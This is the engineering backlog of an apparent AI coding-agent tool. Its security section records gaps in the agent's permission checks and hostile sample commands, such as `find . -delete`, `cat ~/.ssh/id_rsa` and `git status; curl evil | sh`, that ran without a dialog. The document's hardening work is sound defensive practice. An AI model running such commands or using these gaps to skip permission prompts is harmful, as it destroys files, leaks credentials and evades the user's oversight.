# TASKS — zode improvement backlog

> New board after the feature work was completed and the old board was removed.
> This is a **quality backlog**: security, token efficiency, refactoring, test
> coverage, UX polish and tooling. It is not a feature roadmap.
>
> One checkbox per deliverable. Ticking a box means: `zig build test` green ·
> the item's acceptance check passes · this file updated.

## Legend

| Badge | Track | Priority | Meaning |
| --- | --- | --- | --- |
| 🔒 | security | 🔴 | critical — do first |
| ⚡ | tokens/performance | 🟠 | high — direct cost/latency win |
| 🏗️ | refactor | 🟡 | medium — maintainability |
| 🧪 | tests | 🟢 | on demand |
| 🎨 | UX/TUI | 🟢 | on demand |
| 📚 | tooling/docs | 🟢 | on demand |

IDs are grouped by track so they can be worked in any order inside a track.

---

## Phase 40 — 🔒 Security hardening

- [x] 🔴 **40.1 Close the `find`/`fd`/`stdbuf`/`jq`/`yq` read-only bypass.** They sit in `read_only_programs` (`src/lib/cmdsafety.zig:92-103`) and are classified without inspecting flags (`src/lib/cmdsafety.zig:475-480`), so `bash("find . -delete")`, `find -exec sh -c …`, `fd -x rm` and `stdbuf … rm` run with no dialog and are not blocked in Plan mode. Move them out of the read-only set, escalate `find`/`fd` on `-exec/-execdir/-ok/-delete/-fprint*`, treat wrappers as `.executes`, and add tests beside `src/lib/cmdsafety.zig:634`.
- [x] 🔴 **40.2 Fix the ACP permission bypass.** `src/acp/server.zig:929-937` uses only the static `needsPermission(name)`, so per-operation tools (`github` write ops, `config set`, `memory propose`) are auto-approved, and there is no Plan-mode gate. Use `tools_mod.callPermissionTools(name, args, arena)` plus `shouldBlockReadOnly` and risky-path checks, matching `src/agent/tool_exec.zig:457-520`.
- [x] 🔴 **40.3 Stop read-only `bash` from reading secrets with no prompt.** `bash cat ~/.ssh/id_rsa` and `head ~/.config/zode/auth.json` are classified read-only (`src/agent/tool_exec.zig:468,518`). Apply a `pathsafe.checkReadResolved`-equivalent to paths in read-only bash commands, or force a dialog for paths under `~/.config`, `~/.ssh`, `~/.aws`.
- [x] 🔴 **40.4 Redact credentials embedded in the GitHub remote URL.** `src/lib/github/context.zig:61` keeps the raw URL and `src/tools/github.zig:86-90` prints it into a read-only tool result. Store/print a sanitized URL (strip userinfo) and add a test with a credential-bearing remote.
- [x] 🔴 **40.5 Refuse off-origin GitHub pagination links.** `src/lib/github/api.zig:67-72,159-179` follows any absolute `next` URL from a `Link` header while attaching the Bearer token. Require scheme+host+port to match `r.api_base` before following.
- [x] 🔴 **40.6 Fix the O(n²) `redact()` hang.** `src/lib/redact.zig:39-40` re-scans `text[i..]` for `_KEY=`/`_TOKEN=` at every byte; a 50 KB tool result costs billions of comparisons on every `Session.append`. Hoist one `indexOf` outside the loop and add a 100 KB input test.
- [x] 🟠 **40.7 Make sensitive writes symlink-safe and atomic.** `writeFileSecure` has a TOCTOU window on `{path}.tmp` (`src/config.zig:896-903`), self-update uses predictable `{exe}.new` (`src/lib/selfupdate.zig:407-424`), and remote pulls write straight over the session (`src/lib/remotesync.zig:91-95`). Use random temp names, `O_EXCL|O_NOFOLLOW`, verify regular file/owner, then atomic rename. Apply the same pattern to `pluginstore.zig:103,123`.
- [x] 🟠 **40.8 Resolve symlinks before `grep`.** `src/tools/grep.zig:233,238` checks only literal strings, so a symlink to `auth.json` can be searched and its contents exfiltrated. Use `pathsafe.checkReadResolved` on matched files. (`glob.zig` lists names only — lower priority.)
- [x] 🟠 **40.9 Reject shell chaining in turn-scoped allow rules.** `src/lib/cmdsubst.zig:247-274` auto-allows `Bash(git *)` even for `git status; curl evil | sh`, while the persisted allowlist already rejects this. Reuse the shared chaining/redirect helper.
- [x] 🟠 **40.10 Add HTTP request timeouts.** `src/lib/io_timeout.zig` wraps the `vtable.operate` function pointer with `std.Io.operateTimeout` (only that one entry changes; every other vtable entry keeps the original userdata). `Http.init` now routes through `Http.initTimed` with `ZODE_HTTP_TIMEOUT_MS` (default 60 s, 0 disables), and `selfupdate` wraps its raw `std.http.Client` with a fixed 5 s bound. The earlier attempt failed because it wrapped only the client constructor while the chat worker builds its own `Io` — this version is wired at every construction site. Verified end-to-end against a server that accepts and never replies: `--chat` fails in 2 s instead of hanging; a self-contained regression test uses a listener that never accepts.
- [x] 🟡 **40.11 Clamp scrypt parameters from the master-key envelope.** `src/lib/authstore.zig:97-102,127-128` trusts on-disk `ln/r/p`; clamp to OWASP values and propagate `fillRandom` failure instead of returning a partial key.
- [x] 🟡 **40.12 Harden the crash log path.** `/tmp/zode-crash.log` is predictable and symlinks are followed (`src/main.zig:113,161-167`). Use `O_NOFOLLOW`, verify a regular file owned by the user, or move under a 0700 per-user cache dir.
- [x] 🟢 **40.13 Do not echo tokens in `/remote status`.** `src/commands.zig:401` prints `cfg.url` verbatim; a token in a query string would leak. Strip query/userinfo. The token itself is already only sent as a header — keep that.

---

## Phase 41 — ⚡ Token and performance efficiency

- [x] 🟠 **41.1 Add a terse tool-description mode.** The 51 tool schemas cost ~63 KB / ~15.8k tokens **on every request** (`src/tools/prompts/*.zig`, assembled at `src/tools/registry.zig:1155-1179`); worst are `task` (2 KB), `bash` (2 KB), `notebook_edit` (1.6 KB). Keep a ≤200 B core description in the schema, move "USE INSTEAD OF / LIMITS / ON ERROR" prose to an on-demand help, behind `ZODE_TERSE_TOOLS=1` or an output-style switch. Target: ~3-8k tokens/request saved.
- [x] 🟠 **41.2 Trim `tool_routing_prompt` duplication.** `src/lib/prompt.zig:121-143` (7.2 KB) re-teaches `web_fetch`, `check`, Jupyter, `read` mechanics already present in their schemas. Keep category-level rules only (~1.5 KB). Update the keyword test at `src/lib/prompt.zig:374-416` to assert principles, not sentences.
- [x] 🟡 **41.3 Merge duplicate verification rules.** `src/lib/prompt.zig:155-169` states four rules twice; the test at `:327-356` only compares *different* blocks so paraphrases survive. Merge to ~10 bullets and strengthen the test to check within each block.
- [x] 🟡 **41.4 Trim `ask.guidance`.** `src/lib/ask.zig:249` duplicates the `ask` tool schema's "when to use" prose. Keep only dialog mechanics (Esc, header, option count).
- [x] 🟠 **41.5 Stop re-parsing tool-call JSON for every history message.** Rendered tool_use blocks are cached in a fixed 64-entry array keyed by the source string pointer (stable for the session), guarded by an atomic mutex. The parse + argument expansion happens once per message, not once per request. A regression test builds the same body twice and compares the bytes. `src/chat.zig:1786,1807` parses `m.tool_calls_json` and each argument on every body build — ~80 parses/request for 40 tool calls. Store the parsed/rendered form on the message when the call arrives; `buildBody` then only writes bytes.
- [x] 🟡 **41.6 Skip the update network call for dev builds.** `src/lib/selfupdate.zig:324` rejects non-semver `dev`, so the cache-hit branch never returns and every dev launch makes a live HTTPS request. Read the cache and notify from it, or skip entirely when `current_version == "dev"`.
- [x] 🟡 **41.7 Cache plugin discovery.** `src/agent/prompt_system.zig:168` scans the plugin dir on every system-prompt compose while skills/styles have mtime caches. Mirror `skillsFresh` from `src/agent/discovery.zig:260`.
- [x] 🟠 **41.8 Avoid full live-paragraph re-parse each streaming frame.** The Model now owns a persistent arena holding the last live text AND its rendered PLines, keyed by a Wyhash of the text and the wrap width. A frame with unchanged streaming text reuses the cached lines instead of re-copying and re-parsing the whole answer. The text is copied into the model arena so cached cells never reference a dead frame arena (the grapheme-lifetime bug class). Validated with ui-frame + pty smoke. `src/tui.zig:9902,9968-9979,9971` duplicates and re-parses the whole answer every frame and sets `diff_needs_full_redraw`. Track `parsed_up_to` and re-parse only the tail window, falling back on a new code fence.

---

## Phase 42 — 🏗️ Refactoring and deduplication

- [x] 🟠 **42.1 Unify JSON string escaping into `src/lib/json_escape.zig`.** Nine copies with three algorithms (`src/lib/taskstore.zig:638`, `src/lib/session/index.zig:382`, `src/config.zig:988`, `src/lsp/protocol.zig:57`, `src/mcp/protocol.zig:94`, `src/acp/protocol.zig:105`, `src/lib/modelcache.zig:350`, `src/session.zig:1085`, `src/chat.zig:1886`). Several do not escape control bytes `< 0x20` (invalid JSON). Keep the most complete version; ~130 lines removed.
- [x] 🟠 **42.2 Unify the `ZODE_MAX_TOOL_OUTPUT` K/M/G parser.** Byte-identical in `src/tools/common.zig:44`, `src/tools/git.zig:58`, `src/tools/grep.zig:366`, called from four startup paths. One `parseSize(raw, cap)` + `initCaps(env)`; ~45 lines and 9 call sites removed.
- [x] 🟡 **42.3 Extract a shared frontmatter parser.** `src/lib/skills/core.zig:164`, `src/lib/outputstyle/core.zig:76`, `src/lib/agentdefs.zig:75` each carry the same ~28-line scanner; `src/lib/memory/core.zig:45` imports skills just for it. New `src/lib/frontmatter.zig` with `pairs(text)` + `unquote`; each module keeps only its key switch (~60 lines removed).
- [x] 🟡 **42.4 Unify `containsIgnoreCase` (six copies).** `src/lib/models.zig:260`, `fuzzy.zig:217`, `memory/core.zig:114`, `session/search.zig:16`, `plugins.zig:89`, `src/tui.zig:1282` have divergent empty-needle semantics. Use `fuzzy.containsIgnoreCase`/`indexOfIgnoreCase` everywhere. Note: the `plugins.zig` copy is correct in context (the needle is lowercased by `search()` before the call) — this is a dedup item, not a bug fix.
- [x] 🟡 **42.5 Unify env readers.** `src/lib/env.zig:19,37` and `src/lib/envutil.zig:3,9` differ on empty values; `envutil.truthyIn` has zero callers. Keep `env.getIn`/`truthyIn`; move `loadDotEnv` to `src/lib/dotenv.zig`.
- [x] 🟡 **42.6 Add one XDG-aware config-dir helper.** `src/config.zig:843,118`, `src/lib/modelcache.zig:79`, `src/lib/github/api.zig:27` hardcode `HOME/.config/zode`; `src/lib/session/path.zig:49-77` already has the OS/XDG-aware pattern. Route all four through it and honor `XDG_CONFIG_HOME`.
- [x] 🟡 **42.7 Delete verified dead code.** Three dead modules and 27 repo-wide zero-call functions removed (agent, tui, session, mascot, bgproc, compaction, submodel, tool_exec_perm); all call sites verified with repo-wide grep before deletion. ~72 zero-call functions and whole modules: `src/lib/textadmit.zig` (294 lines, self-documents as unwired), `src/agent/cheap_router_state.zig` (imported but unused), `src/lib/shellquote.zig:4`, two `bundled_*` facades, plus named functions in `agent.zig`, `tui.zig`, `palette.zig`, `session.zig`, `chat.zig`. Verify entry points (`tools/memaudit.zig` imports from outside `src/`) and keep `test_all.zig` in sync.
- [ ] 🟡 **42.8 Break the `agent ↔ tui ↔ commands` import cycle — PARTIAL (advanced this pass).** Removed the duplicate `agent_mod` alias earlier; this pass deleted the 5 public one-line `pushInfo*`/`pushError*` forwarders in `agent.zig` and changed all 337 call sites in `commands.zig` + `free_auto.zig` to call the `Model` methods directly. `commands.zig` went from ~600 to 254 `agent.*` references. A FULL break still needs dependency inversion for the remaining shared runtime STATE (session, model, context numbers) and the ~55 agent symbols the TUI event/draw handlers call: a 55-entry function-pointer bridge would add 55 indirections, which conflicts with AGENTS.md's "radical simplicity" rule and has real regression risk for no functional gain. A facade that merely re-exports types would not break the cycle at all. `agent.zig:6` imports `tui.zig` while `tui.zig` imports `agent.zig`; `commands.zig` and `agent.zig` also import each other.
- [x] 🟡 **42.9 Split the oversized files.** `main.zig` 1640 -> 753 via `src/headless.zig`; `tui.zig` 19674 -> 11559 via `src/tui_tests.zig` (221 tests), `src/tui_events.zig` (786 lines, the whole event dispatch) and `src/tui_draw.zig` (517 lines, the whole draw dispatch). The boundary is an explicit public API: helpers used across the split are now `pub` and called through the `tui.` namespace. Also removed the write-only `diff_needs_full_redraw` field. `src/tui.zig` has a 763-line event handler, a 497-line draw function and 221 tests in its last third; `src/agent.zig` has 201 interleaved tests and ~120 wrapper functions; `src/main.zig:394` has a 576-line `runChat`. Extract `tui/events.zig`, `tui/draw/*`, `agent/tests.zig`, `headless/*`.
- [x] 🟢 **42.10 Migrate deprecated `std.fmt.bufPrint` (355 sites).** Dropped-in replacement by `std.mem.print` (same signature). `memaudit` updated to recognize both spellings. Mechanical `std.mem.print` migration per AGENTS.md; do it in one reviewed pass.

---

## Phase 43 — 🧪 Test coverage

- [x] 🟠 **43.1 Test and register the ACP server.** `src/acp/server.zig` has 1,078 lines and 0 tests and is not reachable from `src/test_all.zig`. Add `pub const acp_server = @import("acp/server.zig");` then test `initialize` capabilities and a bad `jsonrpc` version.
- [x] 🟠 **43.2 Add behavioral tests to `src/agent/tool_exec.zig`.** 666 lines, 0 tests, core execution path. Cover: `PreToolUse` block/`updatedInput`/`PostToolUse` note (`:592-618`), `permDecisionWithPolicy` (`:420`), a failing parallel job still returning the others (`:127`).
- [x] 🟠 **43.3 Replace the vacuous `http_client.zig` test.** `src/lib/http_client.zig:333` defines a struct that is never used. Assert exact `jsonStringify` output; add error classification tests (429 → `RateLimited`, 402/403 distinct, malformed URL → `InvalidUrl`, Bearer never in error text).
- [x] 🟠 **43.4 Test the self-update replace flow.** `src/lib/selfupdate.zig` has 8 tests, none for `.new` + atomic rename, `--version` verification, or refusing a downgrade. Add `applyUpdate refuses an older version and never writes the binary` and `applyUpdate leaves no partial file on failure`.
- [x] 🟡 **43.5 Strengthen weak tests.** Deterministic parseMillis tests added; wall-clock assertions relaxed to floors; highlight now asserts the escaped segment is a string. `src/chat.zig:161-166` admits tests compare zode's output against zode's own table — add an external effort fixture. `src/tools/sleep.zig` has four real-sleep tests — inject a fake clock. `src/lib/highlight.zig:310` only asserts text preservation — assert segment styles.
- [x] 🟡 **43.6 Cover untested error paths.** Session corrupt-line skip is tested; the failed-spawn branch is exercised with a deterministic FailFirstAllocator and asserts the mutex is released (no threads needed). The spawn failure leak itself was fixed earlier. Session corrupt-line skip and compact-sidecar fallback (`src/session.zig:116,353-371`), compaction `tryLaunchBg` spawn failure leaves the mutex unlocked (`src/compaction.zig:298-333`), hook/sidecar `catch` branches (`src/agent/tool_exec.zig:542,592,614,631`).
- [x] 🟡 **43.7 Expand pty smoke coverage.** Added tools/headless_smoke.py driving --chat against fake_provider.py with the built-in `local` provider; checks the answer reaches stdout, a tool call executes, and no panic. Fixed two real bugs it exposed: the headless runner never called models.dbgInitEnv (all errors were silent) and fake_provider had no scenario that finished via send_user_message. No automated check for the permission approve/deny flow, hooks in the real tool loop, background completion injection, `/remote`, or the fake-provider turn. Wire `tools/fake_provider.py` into a new smoke script; keep `tools/pty_smoke.py` as the base.
- [x] 🟢 **43.8 Add missing regression tests.** modelcache atomicity and the compaction deep-copy UAF are covered; segv_probe.py now requires the FULL termseq.restore_all byte sequence and a `pc:` entry in the crash log. Compaction deep-copy UAF (`git 04584f9`), modelcache temp+rename atomicity (`git 57a4a14`), and both crash-handler paths emitting `restore_all` plus a `pc:` line (`tools/segv_probe.py` only checks the latter).

---

## Phase 44 — 🎨 UX and TUI polish

- [x] 🟠 **44.1 Make Ctrl+R refresh the model palette as advertised.** `src/palette.zig:1175,1556` promises it but `src/tui.zig:9133-9141` handles Ctrl+R globally first. Add `and !self.pal.active` to the global branch.
- [x] 🟠 **44.2 Stop global shortcuts leaking into an open palette.** `src/tui.zig:9120-9177` runs Ctrl+A/L/R/V/G/F/O before `paletteKey` at `:9179`, so Ctrl+L wipes the transcript behind the modal. Dispatch to `paletteKey` right after the palette toggles.
- [x] 🟠 **44.3 Do not quit the app from inside a modal.** `src/tui.zig:9008-9022` sits above every modal handler; with empty input the first Ctrl+C sets `ctx.quit` instead of closing the topmost picker.
- [x] 🟠 **44.4 Fix misleading help and docs for Ctrl+C / Ctrl+D.** `src/commands.zig:2716-2717`, `docs/commands.md:289-290`, `docs/usage.md:167-168` contradict the code and each other (`--chat` sees Ctrl+D as Exit, code scrolls; Ctrl+C never interrupts a turn — Esc does). Unify to one accurate wording.
- [x] 🟠 **44.5 Wire or remove undocumented-but-advertised commands.** `docs/usage.md:25` claims `--chat "/context"` works, but `src/main.zig` never imports `commands.zig`. About 16 more commands (`/read`, `/write`, `/edit`, `/glob`, `/grep`, `/notebook`, `/web_fetch`, `/verify`, `/todo`, `/skill`, `/new`, `/reset`, `/connect`, …) are documented but absent from the dispatch chain (`src/agent.zig:2954-3184`). Add aliases where handlers exist, wire the rest, or remove them from docs.
- [x] 🟡 **44.6 Add a compact fallback for tiny terminals.** `src/tui.zig:9766` returns an empty surface below 12×6, so a small pane looks frozen. Paint a one-line "terminal too small (min 12x6)" when at least one cell is available.
- [x] 🟡 **44.7 Convey severity without colour.** Under `NO_COLOR`, `ok`/`warn`/`err` are identical plain text (`src/lib/theme.zig:91-93,540-548`); daltonized handling only covers diffs. Give warn/err a distinct non-colour attribute or a text prefix.
- [x] 🟡 **44.8 Require confirmation for `/undo` and `/rewind N`.** They overwrite/delete files with no dialog (`src/commands.zig:3535-3578,4214-4234`), unlike `/clean`'s dry run. Add an explicit confirm token and list affected files first.
- [x] 🟡 **44.9 Make the new Phase 13 commands discoverable in Settings.** `src/lib/configmenu.zig:40` promises "keybindings" but `:189` has no such row, and there is no `/plugin`, `/remote` or `/keybinds` entry. Rename the hint or add an `.action` row that opens `/keybinds`.
- [x] 🟢 **44.10 Fix small UX defects.** Duplicate `/rewind` row (`src/commands.zig:2749-2750`); all-English rule violations in `/goal`'s `<objetivo>` hint (`src/commands.zig:2740`) and `src/main.zig:424`; document that custom bindings do not fire inside modals (`docs/commands.md:46-47`).
- [x] 🟢 **44.11 Show tick-registration failure in the app.** `src/tui.zig:7268` only prints to stderr; a dead tick timer looks like a frozen UI. Also emit a notification.
- [x] 🟢 **44.12 Fill the shortcut/help tables.** `src/commands.zig:2709-2724` omits Ctrl+G/F/O/, `?`, alt-brackets and the default f2-f5 bindings; `docs/commands.md:287-302` omits Ctrl+A/V/G/F/, and `?`.

---

## Phase 45 — 📚 Tooling, CI and documentation

- [x] 🟠 **45.1 Make release publishing atomic.** `.github/workflows/release.yml:12-113` has four independent matrix jobs calling `action-gh-release` with `fail-fast: false`, so a partial asset set can publish. Split into build + a single publish job that asserts all four assets; add a `workflow_dispatch` dry-run.
- [x] 🟠 **45.2 Add checksums end to end.** The release publishes SHA256SUMS; install.sh verifies; self-update now fetches the same release's SHA256SUMS and refuses a mismatching asset before writing anything (BadChecksum). Old releases without sums keep the --version/--selftest probes. Generate `SHA256SUMS` in the release workflow and verify in `install.sh:193-220` (`sha256sum -c`, with `shasum -a 256` fallback on macOS). Also pin a published hash in self-update (currently only `--version` is checked).
- [x] 🟠 **45.3 Make the installer fail loudly and roll back.** `install.sh:323-328` exits 0 when post-install `--version` verification fails; `:222-226` overwrites the working binary with no backup. Exit non-zero on failure and restore a `.bak` copy.
- [x] 🟡 **45.4 Fix CI steps that lie or hide failures.** `.github/workflows/zig.yml:17` "Build debug" runs plain `zig build` (ReleaseSmall); `:27-29` uses `|| true` so smoke failures never fail CI; `ZODE_NO_WARMUP` appears only in YAML (no reader in source); the AGENTS-mandated `zig build debug` symbol check is never run. Rename the step, require `zig build pty-check`, remove the dead env var, and add `readelf -SW … | grep .debug_info`.
- [x] 🟡 **45.5 Guard version consistency at release time.** `build.zig.zon:3` is `0.3.0-beta.1`, `-Dversion` defaults to `dev` (`build.zig:7`), and release binaries take the tag verbatim. Add a workflow step asserting the tag matches the zon version.
- [x] 🟠 **45.6 Generate the command reference from the command table.** `docs/commands.md` claims to be complete but is missing ~44 implemented commands, including headline features `/pipeline` and `/code-review` (`src/commands.zig:2740-2800`). Generate the sections from the `(key, desc, key_hint)` table so they cannot drift.
- [x] 🟠 **45.7 Remove or implement four phantom env vars.** `docs/settings.md:176-179` documents `ZODE_MAX_RESULT_CHARS`, `ZODE_MAX_RESULT_BYTES`, `ZODE_MAX_RESULTS_PER_MESSAGE_CHARS`, `ZODE_SUMMARY_MAX_LEN` — none exist in `src/`; the real caps are constants in `src/lib/resultcap.zig:19-23`.
- [x] 🟡 **45.8 Document real settings.** Missing from `docs/settings.md`: `ZODE_AUTH_MASTER_KEY`, `ZODE_AUTH_PASSPHRASE`, `ZODE_MEMORY_EXTRACT`, `ZODE_COMPACT_BG_PCT`, `ZODE_COMPACT_HOT_PCT`, `ZODE_LSP_INIT_TIMEOUT_MS`, `ZODE_TERM_QUERY_MS`, and five provider keys (`ZODE_CEREBRAS_KEY`, `ZODE_TOGETHER_KEY`, `ZODE_FIREWORKS_KEY`, `ZODE_DEEPINFRA_KEY`, `ZODE_SAMBANOVA_KEY`).
- [x] 🟡 **45.9 Make the tools discoverable.** 14 scripts in `tools/` have no discovery path and several are near-duplicates. Add `tools/README.md` with one line + exact invocation each, mark deprecated ones, delete true duplicates. Give `churn.zig` a `--help` branch and make `generate_changelog.py` derive the repo root from `__file__` instead of CWD.
- [x] 🟡 **45.10 Improve CONTRIBUTING.** Add a Testing section (`zig build test -Dtest-filter=name`, `zig build pty-check`, `zig build ui-frame`, `-Drun-args`), a build-steps inventory (15 steps), and guidance for the Phase 13 modules and their reference harnesses (`tools/remote_server.py`, `tools/fake_mcp.py`).
- [x] 🟢 **45.11 Fix stale documentation.** `README.md:75,86,138,196,212` and `AGENTS.md:80-81` describe `-Dstrip=false` as keeping symbols (it does not on ReleaseSafe), call plain `zig build` a debug build, quote old binary sizes and "800+ tests", and omit `docs/releasing.md`/`docs/RULES-ZODE-TUI.md` from the docs table. Run shellcheck on `install.sh` in CI.
- [x] 🟢 **45.12 Fix the remaining English-rule violations in tooling.** `build.zig:172,197` has Spanish in a user-visible step description and comment (`zig build --help` prints it). Translate both.
- [x] 🟢 **45.13 Refresh the release runbook examples.** `docs/releasing.md:71,80,124` still uses `0.2.0 → 0.2.1-beta.1` while the tree is at `0.3.0-beta.1`. Make the examples generic.

---

## Phase 46 — ⚡ Optimization pass (completed)

- [x] 🟠 **46.1 Resolve the color ladder once per paint call.** `Painter.putStableLinked` resolved the style for EVERY cell: a 200-column hairline or a transcript clear redid the RGB→ANSI256 distance math 200 times per frame on 256-color terminals. Added `putStableLinkedResolved` and switched `putText`, `putClipped`, `fillRow`, `fillRange` to resolve once per string/row. No color behavior change (the resolved style is the same value; `ui-frame` covers the render).
- [x] 🟠 **46.2 Copy the tool schema only when it actually changes.** `toolsJsonFilteredFor` rebuilt a ~63 KB schema in a per-request arena on EVERY iteration, even with no deny rules and the default style. It now returns the comptime blob directly (pointer-identical, test pinned); the build path is still used for deny rules and terse. ~63 KB × 12 iterations/turn no longer copied.
- [x] 🟠 **46.3 Tighten the three longest tool descriptions without losing a rule.** `bash` 2051→1599 B, `task` 2065→1444 B, `notebook_edit` 1610→1100 B: ~1.6 KB (~400 tokens) saved on EVERY request in the default style. A cross-tool test pins every load-bearing needle (NO PROMPTS, SAFETY, run_in_background, 16 KB, SAME message, live completion progress, RESUME/FORK, numbered outline, k+1, PRESERVED).
- [x] 🟡 **46.4 Fix the git instruction contradiction.** The location line is composed AFTER the routing table and said "git is available through bash", directly contradicting the rule the model had just read to prefer `git_*` tools. It now names the tools while keeping the `git status`/`git diff` needles the prompt tests pin. Test added in `src/lib/project.zig`.
- [x] 🟡 **46.5 Stop computing the autocomplete match count twice per frame.** `tui_draw.zig` called `tui.matchCount(self)` twice for the same popup decision; compute once.
- [x] 🔴 **46.6 Remove an O(n²) tool-argument reparse in the SSE stream.** `tryEmitTool` re-parsed the ENTIRE accumulated `arguments` buffer on every delta: a 100 KB argument arriving in 1000 chunks reparsed ~50 MB of JSON, all but the last parse certain to fail. A cheap "last non-whitespace byte is a closer" guard runs BEFORE the parse; non-object args still emit at `finish`. Regression test with 300 fragments (including a `}` inside a string) pins single emission and the full payload.
- [x] 🟠 **46.7 Stop copying every unchanged message at the redaction boundary.** `redact` always built a full copy; callers already use `scrubbed.ptr != content.ptr` to decide ownership. It now writes nothing until the FIRST actual redaction and returns the original slice otherwise — one fewer 1 MB alloc+copy per large tool result. Fixed the one caller that memcpy'd the result back onto its own source buffer (`chat.zig`).
- [x] 🟠 **46.8 Reuse the SSE event arena across `data:` lines.** A long answer has thousands of chunks and each parsed into a fresh ArenaAllocator (page alloc + free per token). `StreamCtx` now owns one arena, reset with `retain_capacity` per line; it grows to the largest chunk once. No slice escapes dispatch (every callback copies what it keeps).
- [x] 🟠 **46.9 Reuse the DEFLATE window and writer when persisting session lines.** Added `zjsonl.compressLineWith` taking caller-owned buffers; `Session` keeps one 64 KB window and one retaining writer instead of page-allocating both per compressed message. Round-trip test compresses three different payloads through the same buffers.
- [x] 🟡 **46.10 Cache diff styles per capability set.** `theme.diffStyles` did up to 12 RGB→ANSI256 conversions per call and the diff view calls it per row/word. Eight Caps combinations exist; keyed on the argument so tests that mutate `caps` still invalidate.
- [x] 🟢 **46.11 Delete a duplicated `cache_creation_input_tokens` parse** in the Anthropic `message_start` handler.

---

## Phase 47 — 🔎 Final audit fixes (completed)

- [x] 🔴 **47.1 Fix the headless init-order bug in 40.10.** `headless.zig` built its `Http` before calling `initDefaultTimeout(env)`, so `ZODE_HTTP_TIMEOUT_MS` was ignored for the entire `--chat` turn (the client snapshots the bound at construction). Moved the env call above the constructor and added an end-to-end smoke scenario: a socket that listens but never accepts must fail in ~2 s instead of hanging >10 s. The risk audit of the timeout wrapper (cross-thread vtable escape, race on the global, nested wraps, redact ownership, SSE arena lifetime, DEFLATE reuse) found no other defects.
- [x] 🟢 **47.2 Remove six confirmed-dead declarations.** `agent.zig`: `curProvider`, `cur_key_state`, `cur_key_state_buf`, `resetSession`, `setModelRequestedIterations`, `openConnectPrompt`. `http_client.zig`: `postJsonWithHeaders`. All had zero references across the repo. Note: `model_requested_iter` is now permanently zero (its only writer was the deleted setter) — wiring that feature is a separate functional ticket, not a dead-code cleanup.

---

## Suggested order

1. **Security first:** 40.1 → 40.2 → 40.3 → 40.4 → 40.5 → 40.6.
2. **Then the highest-ROI token wins:** 41.1 → 41.2 → 41.5 → 41.8.
3. **Release integrity:** 45.1 → 45.2 → 45.3 → 45.5.
4. **Docs that lie:** 45.6 → 45.7 → 44.5 → 44.4.
5. **Everything else** by track, taking the small mechanical items (42.2, 42.10, 44.10, 45.12) whenever there is a spare slot.
